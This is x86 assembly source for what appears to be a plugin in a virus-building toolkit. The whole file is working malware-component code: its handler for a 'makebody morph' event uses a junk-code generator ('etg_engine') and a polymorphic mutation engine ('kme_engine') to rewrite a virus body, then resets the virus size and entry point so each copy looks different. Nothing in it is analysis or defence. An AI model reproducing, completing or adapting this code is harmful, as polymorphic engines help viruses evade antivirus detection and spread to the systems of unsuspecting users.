
MAX_ETG_SIZE            equ     8192

include                 ..\..\INCLUDE\consts.inc
include                 ..\MEMORY\MEMORY.INC
include                 ..\MAKEBODY\MAKEBODY.INC
include                 ..\KME\KME.INC
include                 ..\ETG\ETG.INC

                        public  HandleEvent

                        extern  malloc:PROC
                        extern  mfree:PROC

                        extern  rnd:PROC

                        extern  kme_engine:PROC
                        extern  etg_engine:PROC

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

temp_maxsize            dd      ?
temp_ptr                dd      ?
temp_entry              dd      ?
etg_size_1              dd      ?
etg_size_2              dd      ?
kme_size                dd      ?

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_MAKEBODY_MORPH
                        je      __makebody_morph

__return_0:             xor     eax, eax
                        retn

__makebody_morph:

                        xor     eax, eax        ; return code
                        pusha
                        cld

                        mov     ebx, [esp+32+8]         ; user_param

                        ; calc average maximal size
                        mov     eax, [ebx].mbi_vir_size
                        imul    eax, 5
                        add     eax, MAX_ETG_SIZE
                        mov     temp_maxsize, eax

                        ; allocate memory
                        add     eax, 4096       ; some additional bytes
                        push    eax
                        call    malloc
                        mov     temp_ptr, eax

                        mov     etg_size_1, 0
                        mov     etg_size_2, 0

                        test    [ebx].mbi_flags, FL_MBI_SAVEREGS
                        jnz     __skip_2

                        ; skip 1st ETG block with low prob
                        mov     eax, 5
                        callW   rnd_eax
                        jz      __skip_1

                        push    temp_ptr                ; outbuf
                        mov     eax, MAX_ETG_SIZE / 2 - 100
                        callW   rnd_eax
                        add     eax, 100
                        push    eax                     ; maxsize
                        push    100000                  ; ncmds
                        push    offset etg_size_1       ; [out size]
                        callW   rnd_dword
                        and     eax, not REG_EBP
                        push    eax                     ; dst
                        callW   rnd_dword
                        push    eax                     ; src
                        callW   rnd_dword
                        push    eax                     ; cmd
                        call    etg_engine
                        add     esp, 7*4

__skip_1:
                        ; skip 2nd ETG block with low prob
                        mov     eax, 5
                        callW   rnd_eax
                        jz      __skip_2

                        mov     eax, temp_ptr
                        add     eax, etg_size_1
                        push    eax                     ; outbuf
                        mov     eax, MAX_ETG_SIZE / 2 - 100
                        callW   rnd_eax
                        add     eax, 100
                        push    eax                     ; maxsize
                        push    100000                  ; ncmds
                        push    offset etg_size_2       ; [out size]
                        callW   rnd_dword
                        and     eax, not REG_EBP
                        push    eax                     ; dst
                        callW   rnd_dword
                        push    eax                     ; src
                        callW   rnd_dword
                        push    eax                     ; cmd
                        call    etg_engine
                        add     esp, 7*4
__skip_2:

                        mov     eax, FLAG_NOJMPS+FLAG_X_CALLESP+FLAG_X_RETBYJMP
                        cmp     [ebx].mbi_vir_origentry, 0
                        jne     __skipj
                        mov     eax, FLAG_NOJMPS+FLAG_X_CALLESP
                        test    [ebx].mbi_flags, FL_MBI_RET0C
                        jz      __skipj
                        mov     eax, FLAG_NOJMPS+FLAG_X_CALLESP+FLAG_X_RET0C
                        
__skipj:                push    eax  ; flags
                        callW   rnd_dword
;                       mov     eax, CMD_ADD+CMD_SUB+CMD_XOR+CMD_AND+CMD_OR
                        push    eax                     ; cmd mask
                        callW   rnd_dword
;                       mov     eax, CMD2_FPU
                        push    eax                     ; cmd2 mask
                        callW   rnd_dword
                        xchg    esi, eax
                        and     esi, REG_ALL
                        push    esi                     ; regavail
                        push    20   ; unused           ; jmps if rnd(X)==0
                        push    offset temp_entry       ; [output eip]
                        push    offset kme_size         ; [output size]
                        push    0                       ; output filler
                        mov     edi, temp_maxsize
                        sub     edi, etg_size_1
                        sub     edi, etg_size_2
                        push    edi                     ; output/max size
                        mov     edi, temp_ptr
                        add     edi, etg_size_1
                        add     edi, etg_size_2
                        push    edi                     ; output buffer
                        push    [ebx].mbi_vir_currentry  ; input eip
                        push    [ebx].mbi_vir_size       ; input size
                        push    [ebx].mbi_vir_ptr        ; input buffer
                        push    0                       ; initregs
                        push    0                       ; exitregs
                        mov     edi, [ebx].mbi_vir_virtrva
                        add     edi, etg_size_1
                        add     edi, etg_size_2
                        push    edi                     ; vir_rva
                        push    [ebx].mbi_vir_origentry ; original_rva
                        ;;
                        mov     eax, REG_ALL
                        test    [ebx].mbi_flags, FL_MBI_SAVEREGS
                        jnz     __skip_3
                        callW   rnd_dword
                        and     eax, REG_ALL
                        or      eax, REG_EBP
__skip_3:               ;;
                        and     eax, esi                ; esi=regavail
                        push    eax                     ; savereg
                        call    kme_engine
                        add     esp, 4*18

                        mov     [esp].popa_eax, eax     ; return exitcode

                        or      eax, eax        ; error?
                        jz      __exit

                        ; swap old/new buffers
                        mov     eax, temp_ptr
                        xchg    eax, [ebx].mbi_vir_ptr
                        mov     temp_ptr, eax

                        ; set new virsize
                        mov     eax, etg_size_1
                        add     eax, etg_size_2
                        add     eax, kme_size
                        mov     [ebx].mbi_vir_size, eax

                        ; set new virentry
                        mov     eax, etg_size_1
                        mov     [ebx].mbi_vir_currentry, eax
__exit:

                        ; free allocated buffer
                        push    temp_ptr
                        call    mfree

                        popa
                        retn

                        end
